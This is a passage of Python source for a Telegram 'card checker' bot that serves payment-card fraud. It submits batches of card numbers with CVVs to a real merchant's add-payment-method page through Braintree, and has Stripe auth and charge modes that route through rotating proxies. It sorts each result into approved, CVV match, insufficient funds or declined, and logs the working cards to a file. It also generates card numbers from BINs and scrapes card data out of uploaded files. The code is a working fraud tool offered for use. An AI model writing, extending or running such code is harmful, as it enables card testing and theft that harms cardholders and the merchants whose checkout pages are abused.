            }
            response = await session.post('https://boltlaundry.com/my-account/add-payment-method/', headers=headers_confirm, data=data_confirm, follow_redirects=True)
            return response.text, country, brand, bank, prepaid
        except Exception as e:
            return f"EXCEPTION: {str(e)}", '', '', '', ''

    @staticmethod
    async def charge_resp(result):
        error_message = ""
        response = ""
        try:
            json_resp = json.loads(result)
            if "error" in json_resp and "message" in json_resp["error"]:
                raw_html = unescape(json_resp["error"]["message"])
                soup = BeautifulSoup(raw_html, "html.parser")
                div = soup.find("div", class_="message-container")
                if div:
                    error_message = div.get_text(separator=" ", strip=True)
        except Exception:
            try:
                soup = BeautifulSoup(unescape(result), "html.parser")
                div = soup.find("div", class_="message-container")
                if div:
                    error_message = div.get_text(separator=" ", strip=True)
            except Exception:
                error_message = ""
        if "Reason: " in error_message:
            _, _, after = error_message.partition("Reason: ")
            error_message = after.strip()
        if "Payment method successfully added." in error_message:
            response = "Approved ✅"
            error_message = ""
        if error_message:
            return f"{error_message} ❌"
        if response:
            return response
        try:
            if '{"status":"SUCCESS",' in result or '"status":"success"' in result or 'Payment method successfully added.' in result:
                return "Approved ✅"
            elif "Thank you for your donation" in result:
                return "PAYMENT SUCCESSFUL! 🎉"
            elif "insufficient funds" in result:
                return "INSUFFICIENT FUNDS ✅"
            elif "incorrect_cvc" in result or "security code is incorrect" in result:
                return "CVV INCORRECT ❎"
            elif "transaction_not_allowed" in result:
                return "TRANSACTION NOT ALLOWED ❎"
            elif '"cvc_check": "pass"' in result:
                return "CVV MATCH ✅"
            elif "requires_action" in result:
                return "VERIFICATION 🚫"
            elif "three_d_secure_redirect" in result or "card_error_authentication_required" in result:
                return "3DS REQUIRED ❎"
            elif "Your card does not support this type of purchase." in result:
                return "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
            elif "generic_decline" in result:
                return "GENERIC DECLINED ❌"
            elif "do not honor" in result:
                return "DO NOT HONOR ❌"
            elif "fraudulent" in result:
                return "FRAUDULENT ❌"
            elif "invalid cvc" in result:
                return "INVALID CVV ❌"
            elif "stolen card" in result:
                return "STOLEN CARD ❌"
            elif "lost_card" in result:
                return "LOST CARD ❌"
            elif "pickup_card" in result:
                return "PICKUP CARD ❌"
            elif "incorrect_number" in result or "card number is incorrect" in result:
                return "INCORRECT CARD NUMBER ❌"
            elif "Your card has expired." in result:
                return "EXPIRED CARD ❌"
            elif "captcha" in result:
                return "CAPTCHA ❌"
            else:
                with open("result_logs.txt", "a", encoding="utf-8") as f:
                    f.write(result + "\n")
                return result + "❌"
        except Exception as e:
            return f"{str(e)} ❌"

    @staticmethod
    async def multi_checking(fullz: str) -> str:
        start = time.time()
        async with httpx.AsyncClient(timeout=40) as session:
            result, country, brand, bank, prepaid = await BraintreeAuth.create_payment_method(fullz, session)
            response = await BraintreeAuth.charge_resp(result)
        elapsed = round(time.time() - start, 2)
        error_msg = ""
        try:
            json_resp = json.loads(result)
            if "error" in json_resp and "message" in json_resp["error"]:
                raw_html = unescape(json_resp["error"]["message"])
                soup = BeautifulSoup(raw_html, "html.parser")
                div = soup.find("div", class_="message-container")
                if div:
                    error_msg = div.get_text(separator=" ", strip=True)
        except Exception:
            pass
        if "Reason: " in error_msg:
            _, _, after = error_msg.partition("Reason: ")
            error_msg = after.strip()
        if "Payment method successfully added." in error_msg:
            error_msg = ""
        if error_msg:
            output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
                      f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
                      f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_msg} ❌\n"
                      f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
                      f"𝗕𝗮𝗻𝗸 ➯ {bank}\n"
                      f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱 ➯ {prepaid}\n"
                      f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n")
        else:
            output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
                      f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
                      f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}\n"
                      f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
                      f"𝗕𝗮𝗻𝗸 ➯ {bank}\n"
                      f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱 ➯ {prepaid}\n"
                      f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n")
            if response in ["Approved ✅", "CVV INCORRECT ❎", "CVV MATCH ✅", "INSUFFICIENT FUNDS ✅"]:
                with open("auth.txt", "a") as f:
                    f.write(output + "\n")
        return output

    @staticmethod
    async def start_braintree(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if hasattr(update, 'callback_query'):
            chat_id = update.callback_query.from_user.id
        else:
            chat_id = update.effective_chat.id
        
        active_mode_per_chat[chat_id] = 'braintree'
        if hasattr(update, 'callback_query'):
            await update.callback_query.edit_message_text(
                "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV"
            )
        else:
            await update.message.reply_text(
                "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV"
            )

# ---------------------- HANDLER CC MESSAGE ----------------------
async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in admin_chat_ids:
        await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
        return
    mode = active_mode_per_chat.get(chat_id, None)
    if mode is None:
        await update.message.reply_text("PLEASE SELECT AUTH METHOD FIRST WITH /sa or /ba or /sc")
        return
    text = update.message.text.strip()
    cards = parse_fullz(text)
    if not cards:
        await update.message.reply_text("NO VALID CARDS DATA FOUND! MAKE SURE THE FORMAT IS cc|mm|yyyy|cvv")
        return
    msg = await update.message.reply_text("PROCESSING YOUR CARDS, PLEASE WAIT...")
    bar_length = 20
    try:
        total = len(cards)
        for i, card in enumerate(cards, start=1):
            if mode == 'stripe':
                await asyncio.sleep(3)
                result = await StripeAuth.multi_checking(card)
            elif mode == 'braintree':
                await asyncio.sleep(20)
                result = await BraintreeAuth.multi_checking(card)
            elif mode == 'stripe_charge':
                await asyncio.sleep(20)
                proxy = random.choice(proxy_list) if proxy_list else None
                result = await StripeCharge.multi_checking(card, proxy)
            progress_percent = int((i / total) * 100)
            full_blocks = int(bar_length * progress_percent // 100)
            empty_blocks = bar_length - full_blocks
            bar = "█" * full_blocks + "░" * empty_blocks
            try:
                await msg.edit_text(f"\n[{bar}] {progress_percent}%")
            except Exception:
                pass
            await update.message.reply_text(result, parse_mode='HTML')
        await msg.delete()
    except Exception as e:
        await update.message.reply_text(f"ERROR: {str(e)}")

# ---------------------- CC GENERATOR (/gen) ----------------------
API_URL = "https://drlabapis.onrender.com/api/ccgenerator"
def parse_input(input_text):
    input_text = input_text.strip()
    count = 10
    parts_space = input_text.split()
    if len(parts_space) > 1 and parts_space[-1].isdigit():
        count = int(parts_space[-1])
        input_text = " ".join(parts_space[:-1])
    bin_input = input_text
    return bin_input, count

async def ccgen_advanced(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("/gen 550230 5")
        return
    bin_param = args[0]
    count = 10
    if len(args) > 1 and args[1].isdigit():
        count = int(args[1])
    params = {"bin": bin_param, "count": count}
    try:
        r = requests.get(API_URL, params=params)
        if r.status_code == 200:
            raw_ccs = r.text.strip().split('\n')
            message_lines = ["🃏 CREDIT CARD GENERATOR 🃏\n"]
            message_lines.append("```")
            message_lines.extend(raw_ccs)
            message_lines.append("```")
            message = "\n".join(message_lines)
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(
                f"❌ Gagal mendapatkan data dari API. Status code: {r.status_code}"
            )
    except Exception as e:
        await update.message.reply_text(f"⚠️ Terjadi kesalahan: {str(e)}")

async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await ccgen_advanced(update, context)

# ---------------------- CC CLEANER (/clean) ----------------------
def extract_cc_from_line(line):
    pattern = re.compile(
        r"(\d{15,16})\|"
        r"(0?[1-9]|1[0-2])\|"
        r"(\d{2}|\d{4})\|"
        r"(\d{3,4})"
    )
    return [match.group(0) for match in pattern.finditer(line)]

def extract_cc_from_file(input_file, output_file):
    results = []
    with open(input_file, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            results.extend(extract_cc_from_line(line))
    with open(output_file, "w", encoding="utf-8") as f:
        for item in results:
            f.write(item + "\n")
    return len(results)

async def start_clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("HELLO! SEND THE FILE TO BE PROCESSED")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document
    os.makedirs("downloads", exist_ok=True)
    file_path = f"downloads/{file.file_name}"
    new_file = await file.get_file()
    await new_file.download_to_drive(custom_path=file_path)
    os.makedirs("outputs", exist_ok=True)
    output_path = f"outputs/clean_{file.file_name}"
    count = extract_cc_from_file(file_path, output_path)
    if count > 0:
        await context.bot.send_document(chat_id=update.message.chat.id, document=open(output_path, 'rb'))
        await update.message.reply_text(f"{count} CARDS HAVE BEEN SUCCESSFULLY EXTRACTED AND SENT")
    else:
        await update.message.reply_text("NO MATCHING CARDS DATA FOUND")

async def clean_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("SEND THE FILE TO BE PROCESSED")

# ---------------------- COMMAND PROXY ----------------------
async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id != OWNER_ADMIN_ID:
        await update.message.reply_text("ONLY OWNER ADMIN CAN UPDATE PROXY ❌")
        return
    await update.message.reply_text(
        "𝗣𝗥𝗢𝗫𝗬 𝗠𝗔𝗡𝗔𝗚𝗘𝗥\nSEND PROXIES ➯ HOST:PORT:USER:PASS"
    )

async def message_handler_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id != OWNER_ADMIN_ID:
        return
    text = update.message.text.strip()
    lines = [line.strip() for line in text.splitlines() if line.strip()]
    new_proxies = []
    for line in lines:
        parts = line.split(":")
        if len(parts) == 4:
            host, port, user, pwd = parts
            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
            new_proxies.append(proxy_url)
    if new_proxies:
        proxy_list = new_proxies
        save_proxies_to_file(proxy_list)
        await update.message.reply_text(f"PROXY SUCCESSFULLY UPDATED, TOTAL {len(proxy_list)} PROXIES SAVED AND IN USE")
    else:
        await update.message.reply_text("WRONG PROXY FORMAT. USE host:port:user:pass ONE PER LINE")

# ---------------------- ADMIN COMMANDS ----------------------
async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id != OWNER_ADMIN_ID:
        await update.message.reply_text("ONLY OWNER ADMIN CAN ADD ANOTHER ADMIN ❌")
        return
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("/addadmin USER ID")
        return
    try:
        new_admin_id = int(context.args[0])
    except:
        await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER")
        return
    if new_admin_id in admin_chat_ids:
        await update.message.reply_text(f"USER ID {new_admin_id} IS ALREADY AN ADMIN")
        return
    admin_chat_ids.add(new_admin_id)
    save_admin_chat_ids(admin_chat_ids)
    await update.message.reply_text(f"USER ID {new_admin_id} HAS BEEN SUCCESSFULLY ADDED AS ADMIN!")

async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id != OWNER_ADMIN_ID:
        await update.message.reply_text("ONLY OWNER ADMIN CAN REMOVE AN ADMIN ❌")
        return
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("/deladmin USER ID")
        return
    try:
        remove_admin_id = int(context.args[0])
    except:
        await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER")
        return
    if remove_admin_id not in admin_chat_ids:
        await update.message.reply_text(f"USER ID {remove_admin_id} IS NOT AN ADMIN")
        return
    if remove_admin_id == OWNER_ADMIN_ID:
        await update.message.reply_text("YOU CANNOT REMOVE YOURSELF AS OWNER ADMIN ❌")
        return
    admin_chat_ids.remove(remove_admin_id)
    save_admin_chat_ids(admin_chat_ids)
    await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMIN")

# ---------------------- INTERACTIVE MENU ----------------------
def build_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("STRIPE AUTH", callback_data='sa'),
         InlineKeyboardButton("BRAINTREE AUTH", callback_data='ba')],
        [InlineKeyboardButton("STRIPE CHARGE", callback_data='sc'),
         InlineKeyboardButton("CC GENERATOR", callback_data='gen')],
        [InlineKeyboardButton("CC CLEANER", callback_data='clean'),
         InlineKeyboardButton("ADMIN", callback_data='admin')],
        [InlineKeyboardButton("PROXY", callback_data='proxy'),
         InlineKeyboardButton("HELP", callback_data='help')]
    ]
    return InlineKeyboardMarkup(keyboard)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    
    chat_id = query.from_user.id
    
    await query.edit_message_reply_markup(reply_markup=None)
    
    if query.data == 'sa':
        active_mode_per_chat[chat_id] = 'stripe'
        await query.edit_message_text("𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV")
    elif query.data == 'ba':
        active_mode_per_chat[chat_id] = 'braintree'
        await query.edit_message_text("𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV")
    elif query.data == 'sc':
        active_mode_per_chat[chat_id] = 'stripe_charge'
        await query.edit_message_text("𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\nSEND CARDS ➯ CC|MM|YY|CVV")
    elif query.data == 'gen':
        await query.edit_message_text("𝗖𝗖 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥\n\n")
        await gen_command(query, context)
    elif query.data == 'clean':
        await query.edit_message_text("𝗖𝗖 𝗖𝗟𝗘𝗔𝗡𝗘𝗥\n\n")
        await clean_command(query, context)
    elif query.data == 'admin':
        await show_admin_menu(query, context)
    elif query.data == 'proxy':
        await query.edit_message_text("𝗣𝗥𝗢𝗫𝗬\n\nHOST:PORT:USER:PASS")
        await cmd_proxy(query, context)
    elif query.data == 'help':
        await query.edit_message_text("𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 - Check cards with Stripe\n𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 - Check cards with Braintree\n𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 - Charge cards with Stripe\n𝗖𝗖 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥 - Generate credit cards\n𝗖𝗖 𝗖𝗟𝗘𝗔𝗡𝗘𝗥 - Extract cards from files\n𝗔𝗗𝗠𝗜𝗡 - Admin management\n𝗣𝗥𝗢𝗫𝗬 - Manage proxies\n\n/start return to main menu")
    elif query.data == 'addadmin':
        await query.edit_message_text("𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡\n\n/addadmin <USER_ID>")
        await addadmin(query, context)
    elif query.data == 'deladmin':
        await query.edit_message_text("𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗗𝗠𝗜𝗡\n\n/deladmin <USER_ID>")
        await deladmin(query, context)
    elif query.data == 'back':
        keyboard = build_menu_keyboard()
        await query.edit_message_text("𝗣𝗔𝗥𝗔𝗘𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n\n", reply_markup=keyboard)

async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("ADD ADMIN", callback_data='addadmin'),
         InlineKeyboardButton("REMOVE ADMIN", callback_data='deladmin')],
        [InlineKeyboardButton("BACK", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.edit_message_text(
        "𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗡𝗨\n\n",
        reply_markup=reply_markup
    )

# ---------------------- START COMMAND ----------------------
async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != OWNER_ADMIN_ID:
        return
    
    keyboard = build_menu_keyboard()
    await update.message.reply_text(
        "𝗣𝗔𝗥𝗔𝗘𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n\n",
        reply_markup=keyboard
    )

# ---------------------- MAIN SCRIPT ----------------------
if __name__ == "__main__":
    import sys
    proxy_list = load_proxies_from_file()
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("sa", StripeAuth.start_stripe))
    application.add_handler(CommandHandler("ba", BraintreeAuth.start_braintree))
    application.add_handler(CommandHandler("sc", StripeCharge.start_stripe_charge))
    application.add_handler(CommandHandler("gen", ccgen_advanced))
    application.add_handler(CommandHandler("clean", clean_command))
    application.add_handler(CommandHandler("proxy", cmd_proxy))
    application.add_handler(CommandHandler("addadmin", addadmin))
    application.add_handler(CommandHandler("deladmin", deladmin))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), message_handler_proxy))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(CommandHandler("start", start_handler))
    
    print("PARAEL CHECKER BOT RUNNING 🔥")
    try:
        application.run_polling()
    except KeyboardInterrupt:
        print("BOT STOPPED BY USER")
        sys.exit()
